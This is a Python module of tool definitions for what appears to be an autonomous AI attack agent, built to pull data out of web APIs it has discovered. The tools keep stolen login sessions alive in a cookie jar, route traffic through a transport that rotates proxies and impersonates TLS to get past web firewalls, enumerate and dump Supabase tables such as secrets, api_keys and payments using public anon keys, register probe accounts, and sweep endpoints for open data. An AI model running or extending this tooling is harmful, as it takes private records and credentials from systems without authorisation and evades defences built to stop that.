"""TOOL: data_exfil - authenticated data extraction & exfiltration from discovered APIs.

Fills the gap between 'I found an endpoint' and 'I dumped everything from it'.
Supports custom auth headers, pagination, POST bodies, and full response capture.
"""
import json, urllib.request, urllib.error, urllib.parse, time, re, threading
from tools import register

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/151.0.0.0 Safari/537.36"


# ── W12 (mission-78 autopsy): the persistent COOKIE JAR ──────────────
# The #78 root cause of the mid-mission "Signed out" 401s: data_extract
# was STATELESS between calls — Clerk's __client/__session minted in one
# call never reached the next, so she forged 6 cookiejar tools to keep a
# login chain alive. The jar makes session-holding a PLATFORM property:
#   use_jar=True  → cookies received on this host persist for the next
#                   call (per-host, mission-lifetime, thread-safe)
#   jar_clear    → explicit wipe (logout / fresh identity)
# Automatic: Set-Cookie captured on EVERY response (jar or not) so the
# replay decision is always hers.
_JAR_LOCK = threading.Lock()
_JAR = {}          # host -> {cookie_name: (value, expires_ts|None)}


def _host_of(url):
    try:
        return urllib.parse.urlsplit(url).hostname or ""
    except Exception:
        return ""


def _jar_merge(url, headers):
    """Replay the host's stored cookies into the outgoing headers
    (unless the call already carries its own Cookie line)."""
    host = _host_of(url)
    if not host:
        return headers
    with _JAR_LOCK:
        jar = _JAR.get(host) or {}
        now = time.time()
        fresh = {k: v for k, (v, exp) in jar.items()
                 if exp is None or exp > now}
        if fresh:
            h = dict(headers or {})
            if not any(k.lower() == "cookie" for k in h):
                h["Cookie"] = "; ".join(f"{k}={v}" for k, v in fresh.items())
                return h
    return headers


def _jar_capture(url, cookies):
    """Store every Set-Cookie from the response for the host."""
    if not cookies:
        return
    host = _host_of(url)
    if not host:
        return
    with _JAR_LOCK:
        jar = _JAR.setdefault(host, {})
        now = time.time()
        for line in cookies:
            parts = line.split(";", 1)
            if "=" not in parts[0]:
                continue
            name, val = parts[0].split("=", 1)
            name = name.strip()
            exp = None
            m = re.search(r"expires=([^;]+)", line, re.I)
            if m:
                try:
                    import email.utils as _eu
                    exp = _eu.parsedate_to_datetime(m.group(1)).timestamp()
                except Exception:
                    exp = None
            jar[name] = (val.strip(), exp)
        # purge expired
        _JAR[host] = {k: v for k, v in jar.items()
                      if v[1] is None or v[1] > now}


def _jar_clear(host=None):
    with _JAR_LOCK:
        if host:
            _JAR.pop(_host_of(host) or host, None)
        else:
            _JAR.clear()


def _jar_state():
    with _JAR_LOCK:
        now = time.time()
        return {h: sorted(k for k, (v, e) in jar.items()
                          if e is None or e > now)
                for h, jar in _JAR.items()}


# ── W16: keyset-cursor walking (mission-79 autopsy) ─────────────────
# duskyr's listing API paginates with `before_id` (keyset): the LAST
# record's id IS the next page's cursor. The old tool only spoke
# offset/page — she had to re-derive the walk by hand.
_CURSOR_PARAMS = ("before_id", "before", "cursor", "next", "starting_after",
                  "after_id", "last_id")
_CURSOR_FIELDS = ("id", "_id", "cursor", "next_cursor", "timestamp")


def _next_cursor(items, cursor_field=None, hint=None):
    """The cursor for the NEXT page: the last record's cursor field, or a
    top-level next-cursor in a wrapped response. None = page is the end."""
    if cursor_field:
        for rec in reversed(items):
            if isinstance(rec, dict) and rec.get(cursor_field) is not None:
                return rec[cursor_field]
        return None
    # wrapped responses often carry the cursor at top level
    if isinstance(hint, dict):
        for k in ("next_cursor", "next", "cursor", "next_before_id",
                  "has_more"):
            if k in ("has_more",):
                continue
            if hint.get(k) is not None:
                return hint[k]
    for rec in reversed(items):
        if not isinstance(rec, dict):
            continue
        for f in _CURSOR_FIELDS:
            if rec.get(f) is not None:
                return rec[f]
    return None


def _http(url, method="GET", headers=None, body=None, timeout=25,
          content_type=None, _redirects=0, use_jar=False):
    """Data-exfil HTTP lane, now riding the hardened transport.

    Z1.2 (audit-5): _http() was a standalone naked urllib client — no
    proxy pool, no TLS impersonation, no captcha hook, no ROE governor,
    no response cache, no DNS fallback. A WAF the transport would
    rotate around blocked the PRIMARY data-extraction tools forever.
    Now a thin adapter over tools._transport.fetch: same call shape
    (W15 auto-POST, W14 form/JSON body encoding, W12 cookie jar, 307/308
    redirects), all transport features underneath.
    Returns the _http contract: status/body/headers/cookies/size/
    final_url (+ redirect fields on hops).
    """
    if body is not None and (method or "GET").upper() == "GET":
        method = "POST"
    h = dict(headers or {})
    if use_jar:
        h = _jar_merge(url, h)
    # body encoding: form (W14) / raw / json — pre-cooked so fetch
    # ships the exact bytes the old lane shipped.
    wire = None
    if body is not None:
        ct = (content_type or "json").lower()
        if ct == "form":
            if isinstance(body, dict):
                flat = {k: (json.dumps(v) if isinstance(v, (dict, list))
                            else v) for k, v in body.items()}
                wire = urllib.parse.urlencode(flat).encode()
            elif isinstance(body, str):
                wire = body.encode()
            else:
                wire = str(body).encode()
            h.setdefault("Content-Type", "application/x-www-form-urlencoded")
        elif ct == "raw":
            wire = body.encode() if isinstance(body, str) else body
        else:
            wire = json.dumps(body).encode() if isinstance(body, (dict, list)) \
                else body.encode()
            h.setdefault("Content-Type", "application/json")
    from tools._transport import fetch as _fetch
    out = _fetch(url, method=method, headers=h or None, body=wire,
                 timeout=timeout, use_cache=False)
    cookies = out.get("headers", {}).get("set-cookie")
    if isinstance(cookies, str):
        cookies = [cookies]
    _jar_capture(url, cookies or [])
    res = {"status": out.get("status", -1), "body": out.get("body", ""),
           "headers": out.get("headers", {}), "cookies": cookies or [],
           "size": out.get("size", 0), "final_url": out.get("final_url") or url}
    if out.get("redirect_status"):
        res["redirected_from"] = url
        res["redirect_status"] = out["redirect_status"]
    return res
# ─────────────────────────────────────────────────────────
# 1. GENERIC DATA EXTRACTION — hit any URL with any auth
# ─────────────────────────────────────────────────────────
@register(name="data_extract",
          desc="Make an authenticated HTTP request and return FULL response body (up to 60KB, "
               "raise truncate_at for larger captures) "
               "plus response headers and Set-Cookie. "
               "Supports GET/POST, custom headers, POST body as JSON or form-urlencoded. "
               "Set content_type='form' for form endpoints (FastAPI Form fields, login pages). "
               "use_jar=true replays this host's stored cookies (Set-Cookie captured every "
               "call) — login chains stay ALIVE across calls; jar_clear=true wipes them.",
          params={"type": "object", "properties": {
              "url": {"type": "string", "description": "Full URL to fetch"},
              "method": {"type": "string", "description": "HTTP method (default: auto — a body present makes it POST, else GET)"},
              "headers": {"type": "object", "description": "Custom headers dict, e.g. {\"Authorization\": \"Bearer xxx\", \"Cookie\": \"session=abc\"}"},
              "body": {"description": "Request body — dict for JSON/form encoding, string for raw 'key=val&key2=val2'. A body with no explicit method auto-POSTs (W15)"},
              "content_type": {"type": "string", "description": "Body encoding: 'json' (default), 'form' (url-encoded), 'raw' (as-is)"},
              "truncate_at": {"type": "integer", "description": "Response body capture cap in bytes (default 60000 — W10: 15KB truncated checkout HTML mid-RSC-payload)"},
              "use_jar": {"type": "boolean", "description": "W12: replay stored cookies for this host — session chains survive across calls"},
              "jar_clear": {"type": "boolean", "description": "W12: wipe this host's cookie jar BEFORE the call (fresh identity/logout)"}},
              "required": ["url"]})
def data_extract(url, method="GET", headers=None, body=None, content_type=None,
                 truncate_at=60000, use_jar=False, jar_clear=False):
    truncate_at = max(2000, min(int(truncate_at or 60000), 200000))
    if jar_clear:
        _jar_clear(url)
    r = _http(url, method=method, headers=headers, body=body,
              content_type=content_type, timeout=30, use_jar=bool(use_jar))
    # Try to parse as JSON for pretty output
    parsed = None
    try:
        parsed = json.loads(r["body"])
    except Exception:
        pass

    out = {
        "url": url,
        "status": r["status"],
        "size": r["size"],
        "content_type": r["headers"].get("Content-Type", r["headers"].get("content-type", "unknown")),
    }
    if use_jar or jar_clear:
        # the jar's live state rides the response — she sees what she holds
        host_state = _jar_state().get(_host_of(url), [])
        if host_state:
            out["jar_cookies"] = host_state
    # Surface Set-Cookie headers — critical for session capture
    if r.get("cookies"):
        out["set_cookie"] = r["cookies"]
    # Surface security-relevant response headers
    resp_sec = {}
    for hk in ("Location", "X-Request-Id", "X-Powered-By", "Server",
                "WWW-Authenticate", "Access-Control-Allow-Origin"):
        val = r["headers"].get(hk) or r["headers"].get(hk.lower())
        if val:
            resp_sec[hk] = val
    if resp_sec:
        out["response_headers"] = resp_sec
    if r.get("redirected_from") or r.get("final_url", url) != url:
        out["redirected_to"] = r.get("final_url", "")
        out["redirect_status"] = r.get("redirect_status")
    if parsed is not None:
        out["json"] = parsed if len(json.dumps(parsed)) < truncate_at else str(parsed)[:truncate_at]
        out["record_count"] = len(parsed) if isinstance(parsed, list) else 1
    else:
        out["text"] = r["body"][:truncate_at]
    return json.dumps(out, ensure_ascii=False, indent=1)


# ─────────────────────────────────────────────────────────
# 2. PAGINATED DUMP — auto-paginate through REST APIs
# ─────────────────────────────────────────────────────────
@register(name="data_dump_paginated",
          desc="Paginated data extraction from REST APIs. Auto-iterates offset/limit, page, or CURSOR params "
               "(keyset pagination: before_id/cursor/next — auto-detects the cursor field in the response). "
               "Use to dump entire database tables, product lists, user lists, etc. "
               "Stops when empty response or max_pages reached.",
          params={"type": "object", "properties": {
              "url": {"type": "string", "description": "Base URL (without pagination params)"},
              "headers": {"type": "object", "description": "Auth headers dict"},
              "page_size": {"type": "integer", "description": "Records per page (default: 50)"},
              "max_pages": {"type": "integer", "description": "Max pages to fetch (default: 10)"},
              "page_style": {"type": "string", "description": "offset (default) | page | cursor (keyset: before_id/cursor/next auto-walked)"},
              "cursor_param": {"type": "string", "description": "cursor style: the query param name (default: auto-detect: before_id, cursor, next, starting_after)"},
              "cursor_field": {"type": "string", "description": "the LAST record's field carrying the cursor id (default: auto-detect: id, _id, cursor)"},
              "body": {"type": "object", "description": "POST body template (optional)"}},
              "required": ["url"]})
def data_dump_paginated(url, headers=None, page_size=50, max_pages=10, page_style="offset", body=None,
                        cursor_param=None, cursor_field=None):
    # clamps ROE (R5-16): LA seule boucle non bornée de la flotte doit le rester
    max_pages = max(1, min(int(max_pages or 10), 200))
    page_size = max(1, min(int(page_size or 50), 500))
    all_records = []
    pages_fetched = 0
    prev_page = None       # C-DX1: détection « aucun progrès » par CONTENU
    records_capped = False
    method = "POST" if body else "GET"
    cursor = None          # W16: keyset cursor state (auto-walked)
    if page_style == "cursor" and not cursor_param:
        cursor_param = _CURSOR_PARAMS[0]   # before_id — the duskyr grammar

    for page in range(max_pages):
        # Build paginated URL
        sep = "&" if "?" in url else "?"
        if page_style == "cursor":
            # W16 (mission-79 autopsy): keyset pagination — the server
            # returns records plus a cursor (before_id/cursor/next...);
            # the NEXT page asks for records BEFORE that id. Auto-detected
            # from the first response when cursor_param/cursor_field are
            # not given.
            if page == 0:
                paged_url = f"{url}{sep}limit={page_size}"
            elif cursor is not None:
                paged_url = f"{url}{sep}limit={page_size}&{cursor_param}={cursor}"
            else:
                break  # no cursor discovered after page 1 — done
        elif page_style == "offset":
            paged_url = f"{url}{sep}limit={page_size}&offset={page * page_size}"
        elif page_style == "page":
            paged_url = f"{url}{sep}limit={page_size}&page={page + 1}"
        else:
            paged_url = f"{url}{sep}limit={page_size}&offset={page * page_size}"

        r = _http(paged_url, method=method, headers=headers, body=body, timeout=25)
        pages_fetched += 1

        if r["status"] != 200:
            all_records.append({"_page": page + 1, "_error": r["status"], "_body": r["body"][:500]})
            break

        try:
            data = json.loads(r["body"])
        except Exception:
            all_records.append({"_page": page + 1, "_raw": r["body"][:2000]})
            break

        if isinstance(data, list):
            # C-DX1: stop = page VIDE ou aucun progrès (contenu identique au
            # précédent — serveur qui ignore l'offset). L'ancien
            # `len(data) < page_size` lisait « dernière page » sur tout
            # serveur qui clampe la taille de page → dumps silencieusement
            # incomplets. Deux pages PLEINES consécutives (longueurs égales)
            # restent légitimes → jamais de stop sur la longueur seule.
            if len(data) == 0 or data == prev_page:
                break
            all_records.extend(data)
            prev_page = data
            if page_style == "cursor" and data:
                cursor = _next_cursor(data, cursor_field)
        elif isinstance(data, dict):
            # Handle wrapped responses {data: [...], total: N}
            items = data.get("data") or data.get("results") or data.get("items") or data.get("records")
            if isinstance(items, list):
                if len(items) == 0 or items == prev_page:
                    break  # vide = fin réelle ; identique = aucun progrès
                all_records.extend(items)
                prev_page = items
                if page_style == "cursor" and items:
                    cursor = _next_cursor(
                        items, cursor_field,
                        hint=data)   # wrapped: la réponse porte le curseur
            else:
                all_records.append(data)
                break  # Single object, no pagination
        else:
            all_records.append({"_page": page + 1, "_raw": str(data)[:2000]})
            break

        if len(all_records) >= 500:  # cap existant des records rendus
            records_capped = True
            break
        time.sleep(0.3)

    out = {
        "url": url,
        "pages_fetched": pages_fetched,
        "total_records": len(all_records),
        "records_capped": records_capped,
        "records": all_records[:500],  # Cap at 500 records
    }
    result = json.dumps(out, ensure_ascii=False, indent=1)
    if len(result) > 20000:
        # V3 (audit 1.3): never slice mid-key — elide whole records.
        out["records"] = out["records"][:30]
        out["records_elided"] = max(0, len(all_records) - 30)
        out["note"] = "elided for context budget — full dump in extractions/"
        result = json.dumps(out, ensure_ascii=False, indent=1)
    return result


# ─────────────────────────────────────────────────────────
# 3. SUPABASE TABLE ENUM + DUMP — specifically for Supabase
# ─────────────────────────────────────────────────────────
@register(name="supabase_exfil",
          desc="Enumerate and dump Supabase tables using anon key or JWT. "
               "Probes common table names, then dumps accessible ones with full data. "
               "Also tests RPC functions, auth endpoints, and storage buckets.",
          params={"type": "object", "properties": {
              "project_ref": {"type": "string", "description": "Supabase project ref (20-char string) OR full URL"},
              "anon_key": {"type": "string", "description": "Supabase anon/service key (JWT)"},
              "extra_tables": {"type": "array", "items": {"type": "string"}, "description": "Additional table names to probe"},
              "token": {"type": "string", "description": "User JWT if minted via signup"}},
              "required": ["project_ref", "anon_key"]})
def supabase_exfil(project_ref, anon_key, extra_tables=None, token=None):
    # Resolve base URL
    if project_ref.startswith("http"):
        base = project_ref.rstrip("/")
    else:
        base = f"https://{project_ref}.supabase.co"

    auth_headers = {"apikey": anon_key, "Authorization": f"Bearer {token or anon_key}"}
    report = {"base": base, "phases": {}}

    # ── Phase 1: Table enumeration ──
    default_tables = [
        "profiles", "users", "products", "orders", "categories", "payments",
        "subscriptions", "messages", "threads", "comments", "posts",
        "settings", "configs", "api_keys", "tokens", "sessions",
        "user_roles", "permissions", "audit_log", "notifications",
        "files", "uploads", "media", "images", "documents",
        "prices", "plans", "coupons", "promo_codes", "discounts",
        "contacts", "leads", "customers", "invoices", "transactions",
        "freebies", "downloads", "licenses", "vault_items", "secrets",
        "binsites", "tools_public", "pro_methods", "profiles_public",
    ]
    if extra_tables:
        default_tables.extend(extra_tables)
    # Deduplicate
    default_tables = list(dict.fromkeys(default_tables))

    table_results = []
    accessible_tables = []

    for t in default_tables:
        url = f"{base}/rest/v1/{t}?select=*&limit=3"
        r = _http(url, headers=auth_headers, timeout=12)
        entry = {"table": t, "status": r["status"]}

        if r["status"] == 200:
            try:
                data = json.loads(r["body"])
                entry["records"] = len(data) if isinstance(data, list) else 1
                entry["sample"] = data[:3] if isinstance(data, list) else data
                entry["verdict"] = "OPEN"
                accessible_tables.append(t)
            except Exception:
                entry["raw"] = r["body"][:300]
                entry["verdict"] = "OPEN-UNPARSED"
        elif r["status"] in (401, 403):
            entry["verdict"] = "LOCKED"
        elif r["status"] == 404:
            entry["verdict"] = "NOT-FOUND"
        else:
            entry["verdict"] = f"HTTP-{r['status']}"
            entry["detail"] = r["body"][:200]

        table_results.append(entry)
        time.sleep(0.15)

    report["phases"]["table_enum"] = {
        "probed": len(default_tables),
        "accessible": len(accessible_tables),
        "tables": table_results
    }

    # ── Phase 2: Deep dump of accessible tables ──
    full_dumps = {}
    for t in accessible_tables[:10]:  # Max 10 tables deep dump
        url = f"{base}/rest/v1/{t}?select=*&limit=100&order=id.asc"
        r = _http(url, headers=auth_headers, timeout=20)
        if r["status"] == 200:
            try:
                data = json.loads(r["body"])
                full_dumps[t] = {"count": len(data) if isinstance(data, list) else 1,
                                 "data": data[:100] if isinstance(data, list) else data}
            except Exception:
                full_dumps[t] = {"raw": r["body"][:3000]}

        # Also try COUNT
        url_count = f"{base}/rest/v1/{t}?select=count"
        rc = _http(url_count, headers={**auth_headers, "Prefer": "count=exact"}, timeout=10)
        if rc["status"] == 200:
            ct_hdr = rc["headers"].get("content-range", rc["headers"].get("Content-Range", ""))
            full_dumps.setdefault(t, {})["total_count"] = ct_hdr
        time.sleep(0.2)

    report["phases"]["data_dump"] = full_dumps

    # ── Phase 3: Auth probes ──
    auth_results = {}
    # Signup check
    r = _http(f"{base}/auth/v1/signup", method="POST", headers=auth_headers,
              body={"email": f"vf.probe.{int(time.time())}@proton.me", "password": "VfProbe!99zZ"}, timeout=15)
    auth_results["signup"] = {"status": r["status"], "body": r["body"][:300]}

    # Anonymous sign-in
    r = _http(f"{base}/auth/v1/anonymous-signin", method="POST", headers=auth_headers, body={}, timeout=10)
    auth_results["anon_signin"] = {"status": r["status"], "body": r["body"][:300]}

    # Settings
    r = _http(f"{base}/auth/v1/settings", headers=auth_headers, timeout=10)
    auth_results["settings"] = {"status": r["status"], "body": r["body"][:500]}

    report["phases"]["auth"] = auth_results

    # ── Phase 4: Storage buckets ──
    r = _http(f"{base}/storage/v1/bucket", headers=auth_headers, timeout=10)
    storage = {"list_status": r["status"]}
    if r["status"] == 200:
        try:
            storage["buckets"] = json.loads(r["body"])
        except Exception:
            storage["raw"] = r["body"][:500]
    report["phases"]["storage"] = storage

    # ── Phase 5: Common RPCs ──
    rpc_results = {}
    for rpc in ["get_registered_users_count", "get_pro_methods_count", "get_products_count",
                "get_orders_count", "get_total_revenue", "admin_stats", "get_stats",
                "get_user_count", "get_all_users", "search_users"]:
        r = _http(f"{base}/rest/v1/rpc/{rpc}", method="POST", headers=auth_headers, body={}, timeout=8)
        if r["status"] == 200:
            rpc_results[rpc] = {"status": 200, "data": r["body"][:300]}
        elif r["status"] in (401, 403):
            rpc_results[rpc] = {"status": r["status"], "verdict": "LOCKED"}
        # Skip 404s silently
        time.sleep(0.15)

    report["phases"]["rpcs"] = rpc_results

    result = json.dumps(report, ensure_ascii=False, indent=1)
    return result[:20000]


# ─────────────────────────────────────────────────────────
# 4. MULTI-ENDPOINT SWEEP — hit many paths, dump everything
# ─────────────────────────────────────────────────────────
@register(name="api_sweep",
          desc="Sweep multiple API paths against a base URL with auth headers, returning FULL response bodies. "
               "Unlike endpoint_oracle (status-only), this extracts actual data from every path.",
          params={"type": "object", "properties": {
              "base": {"type": "string", "description": "Base URL"},
              "paths": {"type": "array", "items": {"type": "string"}, "description": "List of paths to hit"},
              "headers": {"type": "object", "description": "Auth headers dict"},
              "method": {"type": "string", "description": "GET or POST (default: GET)"}},
              "required": ["base", "paths"]})
def api_sweep(base, paths, headers=None, method="GET"):
    results = []
    for p in paths[:30]:  # Cap at 30 paths
        url = base.rstrip("/") + "/" + p.lstrip("/")
        r = _http(url, method=method, headers=headers, timeout=15)
        entry = {"path": p, "status": r["status"], "size": r["size"]}
        if r.get("redirected_from") or r.get("final_url", url) != url:
            entry["redirected_to"] = r.get("final_url", "")

        # Method-gated backends reject GET with 404/405/307 while the function
        # actually exists: auto-probe POST before declaring anything missing.
        if method == "GET" and r["status"] in (404, 405, 307, 308):
            r2 = _http(url, method="POST", headers=headers, body={}, timeout=15)
            entry["post_probe"] = {"status": r2["status"], "size": r2["size"]}
            if r2["status"] in (200, 202):
                entry["verdict"] = f"OPEN-POST({r2['status']})"
                entry["data"] = r2["body"][:3000]
                entry["status"] = f"GET:{r['status']} -> POST:{r2['status']}"
                results.append(entry)
                time.sleep(0.2)
                continue
            if r2["status"] in (400, 401, 403, 422):
                entry["verdict"] = ("EXISTS-POST-LOCKED" if r2["status"] in (401, 403)
                                    else f"EXISTS-POST({r2['status']})")
                entry["status"] = f"GET:{r['status']} -> POST:{r2['status']}"
                results.append(entry)
                time.sleep(0.2)
                continue

        if r["status"] == 200:
            try:
                data = json.loads(r["body"])
                entry["json"] = data if len(r["body"]) < 5000 else str(data)[:5000]
                entry["record_count"] = len(data) if isinstance(data, list) else 1
            except Exception:
                entry["text"] = r["body"][:5000]
            entry["verdict"] = "OPEN"
        elif r["status"] in (301, 302, 307, 308):
            entry["verdict"] = f"REDIRECT({r['status']})"
            entry["detail"] = r["headers"].get("Location", r["body"][:120])
        elif r["status"] == 405:
            entry["verdict"] = "EXISTS-WRONG-METHOD"
            entry["detail"] = r["body"][:200]
        elif r["status"] == 202:
            entry["verdict"] = "OPEN-ASYNC"
            entry["detail"] = r["body"][:200]
        elif r["status"] in (401, 403):
            entry["verdict"] = "LOCKED"
            entry["detail"] = r["body"][:200]
        elif r["status"] == 404:
            entry["verdict"] = "missing"
        else:
            entry["verdict"] = f"HTTP-{r['status']}"
            entry["detail"] = r["body"][:200]

        results.append(entry)
        time.sleep(0.2)

    return json.dumps(results, ensure_ascii=False, indent=1)[:20000]
